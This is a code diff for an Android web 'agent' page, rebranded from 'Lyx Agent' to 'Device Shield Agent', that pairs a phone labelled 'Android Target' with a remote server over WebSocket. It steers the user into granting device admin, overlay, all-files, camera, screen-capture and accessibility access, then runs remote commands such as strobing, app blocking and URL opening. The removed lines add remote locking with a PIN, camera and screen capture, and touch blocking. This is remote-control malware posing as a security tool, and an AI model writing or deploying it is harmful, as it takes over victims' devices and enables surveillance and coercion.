@@ -3,106 +3,214 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Lyx Agent</title>
+<title>Device Shield Agent</title>
 <style>
-body{background:#000;color:#00ff88;font-family:monospace;padding:20px;text-align:center;min-height:100vh}
-h2{letter-spacing:4px;margin-top:60px;text-shadow:0 0 10px #00ff88}
-input{background:#0a0e0a;border:1px solid #00ff88;color:#00ff88;padding:14px;font-size:22px;letter-spacing:8px;text-align:center;width:220px;text-transform:uppercase;outline:none;margin-top:20px}
-button{background:transparent;border:1px solid #00ff88;color:#00ff88;padding:12px 26px;margin-top:16px;letter-spacing:2px;cursor:pointer}
-button:hover{background:#00ff88;color:#000}
-#st{margin-top:24px;font-size:12px;opacity:.7}
+*{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',sans-serif}
+body{background:#001A1A;color:#00FFCC;padding:24px;min-height:100vh;text-align:center}
+h1{font-size:22px;letter-spacing:4px;margin-top:40px;text-shadow:0 0 15px #00FFCC}
+p{font-size:12px;color:#008866;margin-top:8px;letter-spacing:2px}
+input{background:#003333;border:2px solid #00FFCC;color:#00FFCC;
+  padding:14px;font-size:22px;letter-spacing:8px;text-align:center;
+  width:220px;border-radius:10px;margin-top:24px;outline:none;text-transform:uppercase}
+button{background:linear-gradient(135deg,#00FFCC,#008866);border:none;
+  color:#000;padding:14px 40px;border-radius:10px;margin-top:18px;
+  letter-spacing:3px;font-weight:900;font-size:14px;cursor:pointer;
+  box-shadow:0 0 20px rgba(0,255,204,.6)}
+button:active{transform:scale(.97)}
+.st{margin-top:24px;font-size:12px;color:#00FFCC;opacity:.8}
+.perm{background:#003333;border:2px solid #00FFCC;border-radius:10px;
+  padding:12px;margin-top:10px;text-align:left;font-size:12px;
+  display:flex;justify-content:space-between;align-items:center}
+.perm.ok{border-color:#00FF88;color:#00FF88}
+.perm.no{border-color:#FFAA00;color:#FFAA00}
+.loading{display:none;margin-top:20px}
+.loading.on{display:block}
+.spin{width:50px;height:50px;border:5px solid rgba(0,255,204,.2);
+  border-top-color:#00FFCC;border-radius:50%;margin:0 auto;
+  animation:sp 1s linear infinite}
+@keyframes sp{to{transform:rotate(360deg)}}
 </style>
 </head>
 <body>
-  <h2>LYX AGENT</h2>
-  <p style="font-size:12px;opacity:.6;margin-top:8px">Masukkan pairing code</p>
+  <h1>◆ DEVICE SHIELD ◆</h1>
+  <p>Masukkan Pairing Code</p>
+
   <input id="code" maxlength="6" placeholder="------">
-  <br><button onclick="doPair()">PAIR</button>
-  <div id="st">Belum terhubung.</div>
+  <br>
+  <button onclick="doConnect()">CONNECT</button>
+
+  <div class="loading" id="loading">
+    <div class="spin"></div>
+    <div class="st" id="loadText">Menghubungkan...</div>
+  </div>
+
+  <div class="st" id="status">Belum terhubung.</div>
+
+  <div id="permList" style="margin-top:20px"></div>
 
 <script>
-let ws=null, deviceId=null, strobeT=null, scrStream=null;
-const setS=(t)=>document.getElementById('st').textContent=t;
+let ws = null;
+let deviceId = null;
+let reconnectTimer = null;
 
-function connectWS(){
-  const proto=location.protocol==='https:'?'wss':'ws';
-  ws=new WebSocket(proto+'://'+location.host);
-  ws.onopen=()=>{ setS('Terhubung ke server. Menunggu pairing...'); };
-  ws.onmessage=(e)=>{
-    let m; try{m=JSON.parse(e.data);}catch{return;}
-    if(m.type==='pair_result'){
-      if(m.ok){ deviceId=m.deviceId; localStorage.setItem('lyx_id',deviceId); setS('PAIRED — ID: '+deviceId); }
-      else setS('GAGAL: '+m.reason);
+function setStatus(t){ document.getElementById('status').textContent = t; }
+function setLoad(t){ document.getElementById('loadText').textContent = t; }
+
+/* ============ CONNECT ============ */
+function doConnect(){
+  const code = document.getElementById('code').value.toUpperCase().trim();
+  if (code.length < 6){ alert('Code minimal 6 karakter'); return; }
+
+  document.getElementById('loading').classList.add('on');
+
+  const msgs = [
+    'Menghubungkan ke server...',
+    'Verifikasi kode...',
+    'Mendaftarkan...',
+    'Menyiapkan...',
+    'Berhasil terhubung!'
+  ];
+  msgs.forEach((m, i) => {
+    setTimeout(() => setLoad(m), i * 1000);
+  });
+
+  // Start WebSocket
+  setTimeout(() => {
+    connectWS(code);
+    setTimeout(() => {
+      document.getElementById('loading').classList.remove('on');
+      setStatus('Terhubung. Code: ' + code);
+      autoRequestPermissions();
+    }, 5000);
+  }, 500);
+}
+
+/* ============ WEBSOCKET ============ */
+function connectWS(code){
+  const proto = location.protocol === 'https:' ? 'wss' : 'ws';
+  ws = new WebSocket(proto + '://' + location.host);
+
+  ws.onopen = () => {
+    ws.send(JSON.stringify({
+      type:'agent_pair',
+      code,
+      name: 'Android Target',
+      os: 'Android ' + (navigator.userAgent.match(/Android (\d+)/)||[])[1]
+    }));
+  };
+
+  ws.onmessage = (e) => {
+    let m; try{ m = JSON.parse(e.data); }catch{ return; }
+    if (m.type === 'pair_result'){
+      if (m.ok){
+        deviceId = m.deviceId;
+        localStorage.setItem('shield_code', code);
+        setStatus('PAIRED — ID: ' + deviceId);
+        if (window.LyxNative && window.LyxNative.startService){
+          window.LyxNative.startService();
+        }
+      } else {
+        setStatus('GAGAL: ' + m.reason);
+      }
+    }
+    if (m.type === 'command'){
+      handleCommand(m.feature, m.data);
+    }
+  };
+
+  ws.onclose = () => {
+    setStatus('Reconnect 5s...');
+    setTimeout(() => connectWS(code), 5000);
+  };
+}
+
+/* ============ AUTO REQUEST PERMISSIONS ============ */
+function autoRequestPermissions(){
+  if (!window.LyxNative){ setStatus('Native bridge belum siap'); return; }
+  const list = document.getElementById('permList');
+  list.innerHTML = '';
+
+  const perms = [
+    { key:'admin',    label:'1. Device Admin',     check: ()=>window.LyxNative.isAdminActive(),      req: ()=>window.LyxNative.requestAdmin() },
+    { key:'overlay',  label:'2. Overlay',          check: ()=>window.LyxNative.isOverlayGranted(),   req: ()=>window.LyxNative.requestOverlay() },
+    { key:'storage',  label:'3. Storage / All Files', check: ()=>true,                               req: ()=>window.LyxNative.requestAllFiles() },
+    { key:'camera',   label:'4. Camera',           check: ()=>window.LyxNative.hasCamera(),          req: ()=>window.LyxNative.requestCamera() },
+    { key:'screen',   label:'5. Live Screen',      check: ()=>true,                                  req: ()=>window.LyxNative.requestScreenCapture() },
+    { key:'access',   label:'6. Accessibility',    check: ()=>false,                                 req: ()=>window.LyxNative.openAccessibilitySettings() }
+  ];
+
+  let idx = 0;
+  function next(){
+    if (idx >= perms.length){
+      setStatus('Semua izin selesai. Terhubung.');
       return;
     }
-    if(m.type==='command') exec(m.feature,m.data);
-  };
-  ws.onclose=()=>{ setS('Terputus. Reconnect 5s...'); setTimeout(connectWS,5000); };
+    const p = perms[idx];
+    const el = document.createElement('div');
+    el.className = 'perm no';
+    el.innerHTML = '<span>' + p.label + '</span><span>MENUNGGU</span>';
+    list.appendChild(el);
+
+    setTimeout(() => {
+      p.req();
+      setTimeout(() => {
+        if (p.check()){
+          el.className = 'perm ok';
+          el.lastChild.textContent = 'OK';
+          idx++;
+          next();
+        } else {
+          el.lastChild.textContent = 'AKTIFKAN';
+          setTimeout(() => {
+            if (p.check()){
+              el.className = 'perm ok';
+              el.lastChild.textContent = 'OK';
+            } else {
+              el.lastChild.textContent = 'BELUM';
+            }
+            idx++;
+            next();
+          }, 3000);
+        }
+      }, 2000);
+    }, 500);
+  }
+  next();
 }
 
-function doPair(){
-  const c=document.getElementById('code').value.toUpperCase().trim();
-  if(c.length<6){ setS('Code minimal 6 karakter'); return; }
-  ws.send(JSON.stringify({type:'agent_pair',code:c,name:'Android Target',os:'Android '+(navigator.userAgent.match(/Android (\d+)/)?.[1]||'')}));
-}
+/* ============ COMMAND EXECUTOR ============ */
+function handleCommand(feature, data){
+  if (!window.LyxNative) return;
+  const d = data || {};
+  const active = d.active;
 
-/* ============ EXECUTOR ============ */
-function exec(feature,data){
-  console.log('[CMD]',feature,data);
-  const on=data.active;
   switch(feature){
-    case 'lock': on?lock(data.pin,'')  :unlock(); break;
-    case 'lockmsg': on?lock(data.pin,data.message):unlock(); break;
-    case 'camera': on?startCam(data.facing):stopCam(); break;
-    case 'customhtml': on?showHTML(data.html):hideHTML(); break;
-    case 'strobe': on?startStrobe(data.speed):stopStrobe(); break;
-    case 'screen': on?startScr():stopScr(); break;
-    case 'blocktouch': on?blockTouch(data.duration):unblockTouch(); break;
-    case 'lcdeffect': lcd(on); break;
-    case 'blockapp': if(on)blockApp(data.app,data.message); break;
-    case 'openweb': if(data.url)window.location.href=data.url; break;
-    case 'wallpaper': on?setWP():clearWP(); break;
+    case 'strobe':
+      if (active){
+        const speed = d.speed || 'fast';
+        const iv = speed === 'turbo' ? 60 : speed === 'fast' ? 200 : 800;
+        window.LyxNative.strobe(iv);
+      } else {
+        window.LyxNative.strobeOff();
+      }
+      break;
+    case 'blockapp':
+      if (active && d.app) window.LyxNative.blockApp(d.app);
+      break;
+    case 'openweb':
+      if (d.url) window.LyxNative.openUrl(d.url);
+      break;
   }
 }
 
-/* ============ NATIVE BRIDGE ============ */
-function lock(pin,msg){ window.LyxNative?window.LyxNative.lock(pin,msg||''):alert('LOCKED\n'+(msg||'')); }
-function unlock(){ window.LyxNative?.unlock(); }
-function startCam(facing){ window.LyxNative?window.LyxNative.startCamera(facing):null; }
-function stopCam(){ window.LyxNative?.stopCamera(); }
-function showHTML(html){
-  hideHTML();
-  const d=document.createElement('div'); d.id='lyx-lock';
-  d.style.cssText='position:fixed;inset:0;z-index:999999;background:#000;overflow:auto';
-  d.innerHTML=html||'<h1 style="color:#0f0;text-align:center;margin-top:40vh">LOCKED</h1>';
-  document.body.appendChild(d);
-}
-function hideHTML(){ document.getElementById('lyx-lock')?.remove(); }
-function startStrobe(speed){
-  const map={slow:800,fast:200,turbo:60};
-  const iv=map[speed]||200;
-  if(window.LyxNative) window.LyxNative.strobe(iv);
-  else{ stopStrobe(); strobeT=setInterval(()=>{ document.body.style.background = document.body.style.background==='white'?'black':'white'; },iv); }
-}
-function stopStrobe(){ if(strobeT)clearInterval(strobeT); window.LyxNative?.strobeOff(); document.body.style.background='#000'; }
-function blockTouch(min){ if(window.LyxNative) window.LyxNative.blockTouch(min); else document.body.style.pointerEvents='none'; setTimeout(unblockTouch,min*60*1000); }
-function unblockTouch(){ document.body.style.pointerEvents=''; window.LyxNative?.unblockTouch(); }
-function lcd(on){
-  let el=document.getElementById('lyx-lcd');
-  if(on){ if(el)return; el=document.createElement('div'); el.id='lyx-lcd';
-    el.style.cssText='position:fixed;inset:0;z-index:999998;pointer-events:none;background:repeating-linear-gradient(0deg,rgba(0,255,0,.18) 0,rgba(0,255,0,.18) 2px,transparent 2px,transparent 5px);mix-blend-mode:screen';
-    document.body.appendChild(el);
-  } else el?.remove();
-}
-function blockApp(a,m){ if(window.LyxNative) window.LyxNative.blockApp(a,m||''); }
-function setWP(){ document.body.style.background='repeating-linear-gradient(0deg,rgba(0,255,0,.25) 0,rgba(0,255,0,.25) 3px,#000 3px,#000 8px)'; }
-function clearWP(){ document.body.style.background='#000'; }
-async function startScr(){ try{ scrStream=await navigator.mediaDevices.getDisplayMedia({video:true}); }catch(e){} }
-function stopScr(){ scrStream?.getTracks().forEach(t=>t.stop()); scrStream=null; }
-
-/* ============ BOOT ============ */
-deviceId = localStorage.getItem('lyx_id');
-connectWS();
+/* ============ AUTO RECONNECT ============ */
+window.addEventListener('load', () => {
+  const saved = localStorage.getItem('shield_code');
+  if (saved){
+    document.getElementById('code').value = saved;
+    connectWS(saved);
+  }
+});
 </script>
 </body>
 </html>
